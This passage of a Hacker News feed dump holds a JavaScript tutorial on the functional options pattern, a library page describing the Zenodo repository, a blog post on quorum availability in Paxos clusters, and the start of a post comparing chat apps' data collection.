<h2 id="passing-an-object-literal">Passing an object literal</h2>
<p>Thinking about the problem differently, we could modify the function signature and use an <code>options</code> object literal to pass our options to the function.</p>
<pre><code><span><span>function</span> <span>CreateMeet</span>(<span>options</span>) </span>{
   <span>console</span>.log(options.name, options.startDateTime);
}
</code></pre>
<p>This fails horribly because if we pass an object other than what <code>CreateMeet</code> expects or if we’re not passing anything at all. Without proper validation, executing the function will throw an error. </p>
<p>One fix we could do is to define some sensible defaults and merge our <code>options</code> with the default options.</p>
<pre><code><span><span>function</span> <span>CreateMeet</span>(<span>options</span>) </span>{
  <span>const</span> defaultOptions = {
    <span>name</span>: <span>'No Name'</span>,
    <span>startDateTime</span>: <span>new</span> <span>Date</span>()
  }

  options = {
    ...defaultOptions,
    ...options
  }
}
</code></pre>
<p>Again, without validating <code>options</code> we could merge a totally unrelated object literal with <code>defaultOptions</code>.</p>
<p>Nonetheless, it is a good way of making sure the passed <code>options</code> argument contains all the properties that the function might need and <strong>this solution is enough most of the time</strong>, but it's not the <code>CreateMeet</code> function's job to make sure the options are correct.</p>
<p>Another problem with the solution above is that it's not very reusable in a complex application, where the options are maybe defined in other parts of the code, consider how we would execute this function:</p>
<pre><code>CreateMeet({
  <span>name</span>: <span>'My Meet'</span>,
  <span>startDateTime</span>: <span>new</span> <span>Date</span>(<span>2021</span>,<span>0</span>,<span>6</span>,<span>13</span>,<span>15</span>,<span>0</span>,<span>0</span>)
})
</code></pre>
<p>This type of configuration initialization falls short if we have many configuration options that our function does not necessarily care about, and if we want to validate for correct values too; or if we want to define required options.</p>
<h2 id="passing-in-variables-and-object-literals">Passing in variables and object literals</h2>
<p>One could argue we could write something like this where the <code>name</code> is explicitly defined...</p>
<pre><code><span><span>function</span> <span>CreateMeet</span>(<span>name, options</span>) </span>{
  ...
}
</code></pre>
<p>...but then we circled back to our original problem where every function argument was explicitly defined making it inflexible for future modifications.</p>
<h2 id="passing-in-variadic-variables">Passing in variadic variables</h2>
<p>An alternative solution we could implement is using variadic function arguments.</p>
<pre><code><span><span>function</span> <span>CreateMeet</span>(<span>...options</span>) </span>{
  <span>console</span>.log(options)
}
</code></pre>
<p>With this approach, <code>...options</code> becomes an array of JavaScript primitive types, but we would still need to validate each individual option item in the array to make sure the correct option is passed to our function.</p>
<h2 id="passing-in-variadic-functions">Passing in variadic functions</h2>
<p><strong>Variadic function arguments to the rescue!</strong> In this solution we could just pass in functions for <code>...options</code> and to make sure that we only accept functions as arguments.</p>
<pre><code><span><span>function</span> <span>CreateMeet</span>(<span>...options</span>) </span>{
  options.forEach(<span>(<span>opt</span>) =&gt;</span> {
    <span>if</span> ( <span>typeof</span> opt !== <span>'function'</span> ) { <span>return</span> }
    ...
  })
}
</code></pre>
<p>In the function above if the <code>...options</code> item is not of type function it will continue to iterate to the next item. </p>
<p>Okay, but what's the purpose of this? Well, we could pass in our specific options literal to the option functions that are passed as arguments which in turn validate and modify our options literal, and removing this concern from our <code>CreateMeet</code> function.</p>
<p>Consider the following option function that would be passed to <code>CreateMeet</code>.</p>
<pre><code><span><span>function</span> <span>Name</span>(<span>value</span>) </span>{
  <span>return</span> <span>(<span>options</span>) =&gt;</span> {
    options.name = value
  }
}
</code></pre>
<p>So what's happening here? The <code>Name</code> is an "option function" which, in turn, returns a function accepting our options literal from <code>CreateMeet</code>. Let's modify <code>CreateMeet</code> to understand it more clearly.</p>
<pre><code><span><span>function</span> <span>CreateMeet</span>(<span>...options</span>) </span>{
  <span>let</span> config = {
    <span>name</span>: <span>''</span>,
    <span>startDateTime</span>: <span>null</span>
  }

  options.forEach(<span>(<span>opt</span>) =&gt;</span> {
    <span>if</span> ( <span>typeof</span> opt !== <span>'function'</span> ) { <span>return</span> }
    opt(config)   
  })
</code></pre>
<p>Executing <code>CreateMeet</code> would look like this.</p>
<pre><code>CreateMeet(
  Name(<span>'My Meet'</span>)
)
</code></pre>
<p>Passing in <code>Name</code> as an argument, which, remember, returns a function, and this returned function from <code>Name</code> would be executed in <code>CreateMeet</code> with <code>opt(config)</code> where <code>config</code> is our configuration object literal that we actually care about.</p>
<p>Let's define a <code>startDateTime</code> function option to better understand this method.</p>
<pre><code><span><span>function</span> <span>StartDateTime</span>(<span>year, month, date, hour, minute</span>) </span>{
  <span>return</span> <span>(<span>options</span>) =&gt;</span> {
    
    
    
    month = (month - <span>1</span> &lt;= <span>0</span>) ? <span>0</span> : month - <span>1</span>
    options.startDateTime = <span>new</span> <span>Date</span>(year, month, date, hour, minute, <span>0</span>, <span>0</span>)
  }
}
</code></pre>
<p>Passing in these function arguments to <code>CreateMeet</code> would look like this.</p>
<pre><code>CreateMeet(
  Name(<span>'My Meet'</span>),
  StartDateTime(<span>2021</span>, <span>1</span>, <span>6</span>, <span>13</span>, <span>15</span>)
)
</code></pre>
<p>This makes our function much more readable to other developers, we instantly know that <code>CreateMeet</code> is executed by defining a <code>Name</code> and <code>StartDateTime</code>.</p>
<p>Furthermore, we could extract the initialization of the options altogether from <code>CreateMeet</code> into a separate function such as this, which not necessarily need to be exported.</p>
<pre><code><span><span>function</span> <span>setupConfig</span>(<span>...options</span>) </span>{
  <span>let</span> config = {
    <span>name</span>: <span>''</span>,
    <span>startDateTime</span>: <span>null</span>
  }

  options.forEach(<span>(<span>opt</span>) =&gt;</span> {
    <span>if</span> ( <span>typeof</span> opt !== <span>'function'</span> ) { <span>return</span> }
    opt(config)   
  })

  <span>return</span> config
}
</code></pre>
<p>Now, <code>CreateMeet</code> would only execute code that it cares about.</p>
<pre><code><span><span>function</span> <span>CreateMeet</span>(<span>...options</span>) </span>{
    <span>const</span> config = setupConfig(...options)

    
    <span>console</span>.log(config)
}
</code></pre>
<h2 id="extending-createmeet">Extending CreateMeet</h2>
<p>Extending our <code>CreateMeet</code> function becomes trivial with this approach.</p>
<p>Let's say we want to add another option to our function, but still want to ensure backward compatibility. We want to add the option of allowing only specific users, from a list, in the meet, thus executing <code>CreateMeet</code> will handle this scenario correctly.</p>
<p>Our <code>AllowedUsers</code> function option could look like this.</p>
<pre><code><span><span>function</span> <span>AllowedUsers</span>(<span>userList</span>) </span>{
  <span>return</span> <span>(<span>options</span>) =&gt;</span> {
    options.allowedUsers = userList
  }
}
</code></pre>
<p>Passing in this new option function is as easy as adding a new argument to <code>CreateMeet</code></p>
<pre><code>CreateMeet(
  Name(‘My Meet’),
  StartDateTime(<span>2021</span>,<span>1</span>,<span>6</span>,<span>13</span>,<span>15</span>),
  AllowedUsers([‘john’, ‘jane’])
)
</code></pre>
<p>Keep in mind that the public API of our function hasn't changed, the previous examples work the same way with or without <code>AllowedUsers</code> being passed to <code>CreateMeet</code>.</p>
<p>We can go as far as to add different methods to manipulate the same option, in this example, <code>AllowedUsers</code> only accepts a user list and then overwrites the configuration with that list.</p>
<p>Let's say, down the road, in a future version of our application, we'll want to add a function that accepts a single user name only. In this case, we could write a new function like this.</p>
<pre><code><span><span>function</span> <span>AllowedUser</span>(<span>userName</span>) </span>{
  <span>return</span> <span>(<span>options</span>) =&gt;</span> {
    options.allowedUsers.push(userName)
  }
}
</code></pre>
<p>Executing <code>CreateMeet</code> works as expected, end users can use either <code>AllowedUsers</code> <em>(plural)</em> to pass in a user list or <code>AllowedUser</code> <em>(singular)</em> to append a user name to an existing list.</p>
<h2 id="conclusion">Conclusion</h2>
<p>We, as developers, should be very aware of how the public-facing API of our code is being consumed by other users.</p>
<p>This technique helps to keep this API flexible enough for future modifications and it's just another technique in the arsenal of a developer.</p>
<p>Should you use it every time? Probably not, in most cases passing a configuration object literal is enough, but if you have complex configuration setups, want greater flexibility, and also extracting the configuration setup from functions that don't care about it, then this approach is a good fit.</p>
<p><strong>I hope you enjoyed this article, please comment and consider sharing it.</strong></p>
<p>If you have any questions you can contact me here in the comments or on <a target="_blank" href="https://twitter.com/feketegy">Twitter</a>.</p>
<p>Below you'll find the full example presented in this article as well as a Codepen demo.</p>
<hr>
<h3 id="full-example">Full Example</h3>
<pre><code><span><span>function</span> <span>Name</span>(<span>value</span>) </span>{
  <span>return</span> <span>(<span>options</span>) =&gt;</span> {
    options.name = value
  }
}

<span><span>function</span> <span>StartDateTime</span>(<span>year, month, date, hour, minute</span>) </span>{
  <span>return</span> <span>(<span>options</span>) =&gt;</span> {
    month = (month - <span>1</span> &lt;= <span>0</span>) ? <span>0</span> : month - <span>1</span>
    options.startDateTime = <span>new</span> <span>Date</span>(year, month, date, hour, minute, <span>0</span>, <span>0</span>)
  }
}

<span><span>function</span> <span>AllowedUsers</span>(<span>userList</span>) </span>{
  <span>return</span> <span>(<span>options</span>) =&gt;</span> {
    options.allowedUsers = userList
  }
}

<span><span>function</span> <span>AllowedUser</span>(<span>userName</span>) </span>{
  <span>return</span> <span>(<span>options</span>) =&gt;</span> {
    options.allowedUsers.push(userName)
  }
}

<span><span>function</span> <span>setupConfig</span>(<span>...options</span>) </span>{
  <span>let</span> config = {
    <span>name</span>: <span>''</span>,
    <span>startDateTime</span>: <span>null</span>,
    <span>allowedUsers</span>: []
  }

  options.forEach(<span>(<span>opt</span>) =&gt;</span> {
    <span>if</span> ( <span>typeof</span> opt !== <span>'function'</span> ) { <span>return</span> }
    opt(config)   
  })

  <span>return</span> config
}

<span><span>function</span> <span>CreateMeet</span>(<span>...options</span>) </span>{
    <span>const</span> config = setupConfig(...options)

    
    <span>console</span>.log(config)
}

CreateMeet(
  Name(<span>'My Meet'</span>),
  StartDateTime(<span>2021</span>, <span>1</span>, <span>6</span>, <span>13</span>, <span>15</span>)
)

CreateMeet(
  Name(<span>'Private Meet'</span>),
  StartDateTime(<span>2020</span>, <span>1</span>, <span>6</span>, <span>14</span>, <span>0</span>),
  AllowedUsers([<span>'john'</span>, <span>'jane'</span>])
)

CreateMeet(
  Name(<span>'One-on-one Meet'</span>),
  StartDateTime(<span>2021</span>, <span>1</span>, <span>6</span>, <span>14</span>, <span>30</span>),
  AllowedUser(<span>'kevin'</span>)
)
</code></pre>
<h3 id="codepen-example">Codepen Example</h3>

</div></div>]]>
            </description>
            <link>https://primalskill.blog/how-to-create-flexible-javascript-apis-with-functional-options</link>
            <guid isPermaLink="false">hacker-news-small-sites-25683224</guid>
            <pubDate>Fri, 08 Jan 2021 10:10:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Zenodo open data repository (CERN)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25683140">thread link</a>) | @amai
<br/>
January 8, 2021 | https://www.eui.eu/Research/Library/ResearchGuides/Economics/Statistics/DataPortal/Zenodo | <a href="https://web.archive.org/web/*/https://www.eui.eu/Research/Library/ResearchGuides/Economics/Statistics/DataPortal/Zenodo">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="mainContent">
<div>
<div>
<ul>
<li></li>
<li><a href="#Datadescription">Resource description</a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</li>
<li><a href="#Timeperiod">Time period</a></li>
<li><a href="#Supportlinks">Support&nbsp;links</a></li>
<li><a href="#Howtoaccessdata">How to access data</a></li>
</ul>

<hr>
<h5><a id="Datadescription"><strong>Resource description</strong></a></h5>
<p><a href="https://www.zenodo.org/"><img alt="Zenodo" height="84" width="150" src="https://www.eui.eu/Images/Images-2011/Research/Library/ResearchGuides/Economics/DataLogos/Zenodo150x84.jpg">Zenodo</a>&nbsp;is a multi-disciplinary open repository maintained by <a href="https://home.cern/fr">CERN.</a>&nbsp;Datasets, documents and other research materials can be located via the&nbsp;<a href="https://www.zenodo.org/">Zenodo&nbsp;search&nbsp;engine.</a></p>
<p>Scholars from any research discipline can upload data in any file format. A&nbsp;digital object identifier (DOI) is automatically assigned to all Zenodo files. Details on how to assign metadata&nbsp;to research datasets are in section 5(c) of the EUI Library <a title="EUI Library Research Data Guide" href="https://www.eui.eu/Research/Library/ResearchDataServices/Guide">Research Data Guide. </a>For assistance, write to <a href="https://www.eui.eu/cdn-cgi/l/email-protection#2d5f485e494c594c6d485844034858"><span data-cfemail="b5c7d0c6d1d4c1d4f5d0c0dc9bd0c0">[email&nbsp;protected]</span></a></p>
<p>In April 2020, Zenodo launched a&nbsp;<a href="https://zenodo.org/communities/covid-19/search?page=1&amp;size=20">Coronavirus Research Community - COVID-19</a>&nbsp;accepting data from all scientific disciplines and sub-disciplines.</p>
<p>Zenodo is compliant with the data management requirements of&nbsp;<a href="https://ec.europa.eu/programmes/horizon2020/en/what-horizon-2020">Horizon 2020</a>&nbsp;and <a href="https://ec.europa.eu/info/horizon-europe-next-research-and-innovation-framework-programme_en">Horizon Europe,</a>&nbsp;the&nbsp;EU's research and innovation funding programmes. "The <a href="https://www.openaire.eu/">OpenAIRE</a> project, in the vanguard of the open access and open data movements in Europe, was commissioned by the EC to support their nascent Open Data policy by providing a catch-all repository for EC funded research. <a href="https://home.cern/fr">CERN</a>&nbsp;an OpenAIRE partner and pioneer in open source, open access and open data, provides this capability."</p>

<hr>
<h5><a id="Timeperiod"><strong>Time period </strong></a></h5>
<ul>
<li>Data coverage is indicated in file-level metadata, varying by dataset</li>
<li>Zenodo&nbsp;was launched&nbsp;in 2013.</li>
</ul>

<hr>
<h5><a id="Supportlinks"><strong>Support links</strong></a></h5>
<ul>
<li>Zenodo features are introduced in <a href="https://www.zenodo.org/features">this quick reference guide</a></li>
<li>Data access and reposit services are explained on <a href="https://www.zenodo.org/about">this Zenodo page</a></li>
<li>Policies on access, use, reposit and licensing are explained in <a href="https://www.zenodo.org/policies">this Zenodo directory.</a></li>
</ul>

<hr>
<h5><a id="Howtoaccessdata"><strong>How to access data </strong></a></h5>
<ul>
<li>Locate datasets via&nbsp;<a href="https://www.zenodo.org/">Zenodo ElasticSearch</a></li>
<li>Browse datasets&nbsp;via the <a href="https://www.zenodo.org/communities/">Zenodo communities directory.</a></li>
</ul>

<hr>
<p><a title="Research Data Services" href="https://www.eui.eu/Research/Library/ResearchDataServices">Data homepage</a></p>

</div>

</div>
</div><div id="pageBottom">
<div id="pagetools">
<p>Page last updated on 27 October 2020</p>
</div>


</div></div>]]>
            </description>
            <link>https://www.eui.eu/Research/Library/ResearchGuides/Economics/Statistics/DataPortal/Zenodo</link>
            <guid isPermaLink="false">hacker-news-small-sites-25683140</guid>
            <pubDate>Fri, 08 Jan 2021 09:49:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Quorum Availability]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25683117">thread link</a>) | @fanf2
<br/>
January 8, 2021 | http://brooker.co.za/blog/2021/01/06/quorum-availability.html | <a href="https://web.archive.org/web/*/http://brooker.co.za/blog/2021/01/06/quorum-availability.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post">


<p>It's counterintuitive, but is it right?</p>


<p>In our paper <a href="https://www.usenix.org/conference/nsdi20/presentation/brooker">Millions of Tiny Databases</a>, we say this about the availability of quorum systems of various sizes:</p>

<blockquote><p>As illustrated in Figure 4, smaller cells offer lower availability in the face of small numbers of uncorrelated node failures, but better availability when the proportion of node failure exceeds 50%. While such high failure rates are rare, they do happen in practice, and a key design concern for Physalia.</p></blockquote>

<p>And this is what Figure 4 looks like:</p>

<p><img src="https://mbrooker-blog-images.s3.amazonaws.com/mtb_fig_4.png" alt=""></p>

<p>The context here is that a <em>cell</em> is a Paxos cluster, and the system needs a majority quorum for the cluster to be able to process requests<sup><a href="#foot1">1</a></sup>. A cluster of one box needs one box available, five boxes need three available and so on. The surprising thing here is the claim that having smaller clusters is actually <em>better</em> if the probability of any given machine failing is very high. The paper doesn't explain it well, and I've gotten a few questions about it. This post attempts to do better.</p>

<p>Let's start by thinking about what happens for a cluster of one machine (<em>n=1</em>), in a datacenter of <em>N</em> machines (for very large <em>N</em>). We then fail each machine independently with probability <em>p</em>. What is the probability that our one machine failed? That's trivial: it's <em>p</em>. Now, let's take all <em>N</em> machines and put them into a cluster of <em>n=N</em>. What's the probability that a majority of the cluster is available? For large <em>N</em>, it's 1 for <em>p &lt; 0.5</em>, and 0 for <em>p &gt; 0.5</em>. If less than half the machines fail, less than half have failed. If more than half the machines fail, more than half have failed. Ok?</p>

<p><img src="https://mbrooker-blog-images.s3.amazonaws.com/quorum_avail_a.png" alt=""></p>

<p>Notice how a cluster size of 1 is worse than N up until <em>p = 0.5</em> then better after. <a href="http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.38.5629&amp;rep=rep1&amp;type=pdf">Peleg and Wool</a> say:</p>

<blockquote><p>... for <em>0 &lt; p &lt; ½</em> the most available NDC<sup><a href="#foot2">2</a></sup> is shown to be the "democracy" (namely, the minimal majority system), while the "monarchy" (singleton system) is least available. Due to symmetry, the picture reverses for <em>½ &lt; p &lt; 1</em>.</p></blockquote>

<p>Here, the <em>minimal majority system</em> is the one I'd call a <em>majority quorum</em>, and is used by Physalia (and, indeed, most Paxos implementations). The <em>monarchy</em> is where you have one leader node.</p>

<p>What about real practical cluster sizes like <em>n=3</em>, 5, and 7? There are three ways we can do this math. In <a href="http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.38.5629&amp;rep=rep1&amp;type=pdf">The Availability of Quorum Systems</a>, Peleg and Wool derive closed-form solutions to this problem<sup><a href="#foot3">3</a></sup>. Our second approach is to observe that the failures of the nodes are Bernoulli trials with probability <em>p</em>, and therefore we can read the answer to "what is the probability that 0 or 1 of 3 fail for probability <em>p</em>" from the distribution function of the <a href="https://en.wikipedia.org/wiki/Binomial_distribution">binomial distribution</a>. Finally, we can be lazy and do it with Monte Carlo. That's normally my favorite method, because it's easier to include correlation and various "what if?" questions as we go.</p>

<p>Whichever way you calculate it, what do you expect it to look like? For small <em>n</em> you may expect it to be closer in shape to <em>n=1</em>, and for large <em>n</em> you may expect it to approach the shape of <em>n=N</em>. If that's what you expect, you'd be right.</p>

<p><img src="https://mbrooker-blog-images.s3.amazonaws.com/quorum_avail_b.png" alt=""></p>

<p>I'll admit that I find this result deeply deeply counter-intuitive. I think it's right, because I've approached it multiple ways, but it still kind of bends my mind a little. That may just be me. I've discussed it with friends and colleagues over the years, and they seem to think it matches their intuition. It's counter-intuitive to me because it suggests that smaller <em>n</em> (smaller clusters, or smaller cells in Physalia's parlance) is better for high <em>p</em>! If you think a lot of your boxes are going to fail, you may get better availability (not durability, though) from smaller clusters.</p>

<p>Weird.</p>

<p><strong>Correlation to the rescue!</strong></p>

<p>It's not often that my statistical intuition is saved by introducing correlation, but in this case it helps. I'd argue that, in practice, that you only lose machines in an uncorrelated Bernoulli trial way for small <em>p</em>. Above a certain <em>p</em>, it's likely that the failures have some shared cause (power, network, clumsy people, etc) and so the failures are likely to be correlated in some way. In which case, we're back into the game we're playing with Physalia of avoiding those correlated failures by optimizing placement.</p>

<p>In many other kinds of systems, like ones you deploy across multiple datacenters (we'd call that <em>regional</em> in AWS, deployed across multiple <em>availability zones</em>), you end up treating the datacenters as units of failure. In that case, for 3 datacenters you'd pick something like <em>n=9</em> because you can keep quorum after the failure of an entire datacenter (3 machines) and any one other machine. As soon as there's correlation, the math above is mostly useless and the correlation's cause is all that really matters.</p>

<p>Availability also isn't the only thing to think about with cluster size for quorum systems. Durability, latency, cost, operations, and contention on leader election also come into play. Those are topics for another post (or section 2.2 of <a href="https://www.usenix.org/conference/nsdi20/presentation/brooker">Millions of Tiny Databases</a>).</p>

<p><strong>Updates</strong></p>

<p>JP Longmore sent me this intuitive explanation, which makes a lot of sense:</p>

<blockquote><p>Probability of achieving a quorum will increase when removing 2 nodes from a cluster, each with failure rate p&gt;.5, since on average you're removing 2 bad nodes instead of 2 good nodes. Other cases with 1 good node &amp; 1 bad node don't change the outcome (quorum/not). Repeat reasoning till N=1 or all remaining nodes have p&lt;=.5 (if failure rate isn’t uniform).</p></blockquote>

<p><strong>Footnotes</strong></p>

<ol>
<li><a name="foot1"></a> Physalia uses a very naive Paxos implementation, intentionally optimized for testability and simplicity. The quorum intersection requirements of Paxos (or Paxos-like protocols) are more subtle than this, and work like Heidi Howard et al's <a href="https://fpaxos.github.io/">Flexible Paxos</a> has been pushing the envelope here recently. <a href="https://arxiv.org/pdf/1608.06696v1.pdf">Flexible Paxos:  Quorum intersection revisited</a> is a good place to start.</li>
<li><a name="foot2"></a> Here, an NDC is a <em>non-dominated coterie</em>, and a <em>coterie</em> is a set of groups of nodes (like <em>{{a, b}, {b, c}, {a, c}}</em>). See Definition 2.2 in <a href="https://www.cs.purdue.edu/homes/bb/cs542-20Spr/readings/reliability/How%20to%20assign%20Votes-JACM-garcia-molina.pdf">How to Assign Votes in a Distributed System</a> for the technical definition of domination. What's important, though, is that for each <em>dominated coterie</em> there's a <em>non-dominated coterie</em> that provides the same mutual exclusion properties, but superior availability under partitions. The details are not particularly important here, but are very interesting if you want to do tricky things with quorum intersection.</li>
<li><a name="foot3"></a> Along with a whole lot of other interesting facts about quorums, majority quorums and other things. It's a very interesting paper. Another good read in this space is Garcia-Molina and Barbara's <a href="https://www.cs.purdue.edu/homes/bb/cs542-20Spr/readings/reliability/How%20to%20assign%20Votes-JACM-garcia-molina.pdf">How to Assign Votes in a Distributed System</a>, which both does a better job than Peleg and Wool of defining the terms it uses, but also explores the general idea of assigning <em>votes</em> to machines, rather than simply forming quorums of machines. As you read it, it's worth remembering that it predates Paxos, and many of the terms might not mean what you expect.</li>
</ol>


</div></div>]]>
            </description>
            <link>http://brooker.co.za/blog/2021/01/06/quorum-availability.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25683117</guid>
            <pubDate>Fri, 08 Jan 2021 09:43:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Signal, thank you for not collecting my data. But I won’t use you]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 9 (<a href="https://news.ycombinator.com/item?id=25682981">thread link</a>) | @rukshn
<br/>
January 8, 2021 | https://ruky.me/2021/01/08/signal-thank-you-for-not-collecting-my-data-but-i-wont-use-you/ | <a href="https://web.archive.org/web/*/https://ruky.me/2021/01/08/signal-thank-you-for-not-collecting-my-data-but-i-wont-use-you/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p>Facebook has given an ultimatum for WhatsApp users to either share their data with Facebook or leave the service. And that date is February 8th.</p>
<p>One of the most appealing things about WhatsApp is it’s end to end encryption. Even though their are other chat apps, no one provides end to end encryption to chats by default other than WhatsApp and Signal. </p>
<p>Not even Telegram provide encryption by default, and you need to start a secret chat to enable end to end encryption.</p>
<p>One of the most important things in iOS 14 is the ability for users see what kind of data apps are collecting from their users. </p>

<p>So in light of all this I went through the top 10 social networking/chat apps to see how much data they are collecting in comparison to Signal, and explain why I won’t use Signal and what we can do instead.</p>
<h2>The top 10 social media/chat apps</h2>

<figure><img data-attachment-id="146" data-permalink="https://ruky.me/2021/01/08/signal-thank-you-for-not-collecting-my-data-but-i-wont-use-you/img_1621/" data-orig-file="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_1621.png?fit=828%2C1792&amp;ssl=1" data-orig-size="828,1792" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="img_1621" data-image-description="" data-medium-file="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_1621.png?fit=139%2C300&amp;ssl=1" data-large-file="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_1621.png?fit=473%2C1024&amp;ssl=1" loading="lazy" width="473" height="1024" src="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_1621.png?resize=473%2C1024&amp;ssl=1" alt="" srcset="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_1621.png?resize=473%2C1024&amp;ssl=1 473w, https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_1621.png?resize=139%2C300&amp;ssl=1 139w, https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_1621.png?resize=768%2C1662&amp;ssl=1 768w, https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_1621.png?resize=710%2C1536&amp;ssl=1 710w, https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_1621.png?w=828&amp;ssl=1 828w" sizes="(max-width: 473px) 100vw, 473px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_1621.png?resize=473%2C1024&amp;ssl=1 473w, https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_1621.png?resize=139%2C300&amp;ssl=1 139w, https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_1621.png?resize=768%2C1662&amp;ssl=1 768w, https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_1621.png?resize=710%2C1536&amp;ssl=1 710w, https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_1621.png?w=828&amp;ssl=1 828w" data-lazy-src="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_1621.png?resize=473%2C1024&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP/yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 "></figure>
<h2>Telegram</h2>
<p>Telegram is one of the better apps when we compare with the others in this group. They collect relatively small amount of data.</p>
<p>It is currently the number 1 in my region, Telegram is extremely popular in my region because it provides a great way to share pirated content. </p>
<p>There is no limit to the file size that you can upload on Telegram, and there is no limit for the number of users that a Telegram group can have.</p>
<p>This makes it an ideal place for people to share pirated copies of movies, games, songs in groups with hundreds of users.</p>
<figure><img data-attachment-id="157" data-permalink="https://ruky.me/2021/01/08/signal-thank-you-for-not-collecting-my-data-but-i-wont-use-you/image/" data-orig-file="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image.jpg?fit=473%2C598&amp;ssl=1" data-orig-size="473,598" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="image" data-image-description="" data-medium-file="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image.jpg?fit=237%2C300&amp;ssl=1" data-large-file="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image.jpg?fit=473%2C598&amp;ssl=1" loading="lazy" width="473" height="598" src="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image.jpg?resize=473%2C598&amp;ssl=1" alt="" srcset="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image.jpg?w=473&amp;ssl=1 473w, https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image.jpg?resize=237%2C300&amp;ssl=1 237w" sizes="(max-width: 473px) 100vw, 473px" data-recalc-dims="1" data-lazy-srcset="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image.jpg?w=473&amp;ssl=1 473w, https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image.jpg?resize=237%2C300&amp;ssl=1 237w" data-lazy-src="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image.jpg?resize=473%2C598&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP/yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 "></figure>
<p>I’m bit reluctant to use Telegram due to its poor user interface, and its connections to Russia.</p>
<p>To clarify what I meant by poor user interface, on the android device that I tried Telegram, I was unable to select multiple chats, and deleting a chat is a multi step process. It doesn’t have to be that complicated.</p>
<h2><strong>WhatsApp</strong> </h2>
<p>WhatsApp is currently the number 2 in my region, and when compared with Telegram, WhatsApp is collecting a decent amount of data to track you.</p>
<figure><img data-attachment-id="158" data-permalink="https://ruky.me/2021/01/08/signal-thank-you-for-not-collecting-my-data-but-i-wont-use-you/image-1/" data-orig-file="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/image-1.jpg?fit=473%2C701&amp;ssl=1" data-orig-size="473,701" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="image-1" data-image-description="" data-medium-file="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/image-1.jpg?fit=202%2C300&amp;ssl=1" data-large-file="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/image-1.jpg?fit=473%2C701&amp;ssl=1" loading="lazy" width="473" height="701" src="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/image-1.jpg?resize=473%2C701&amp;ssl=1" alt="" 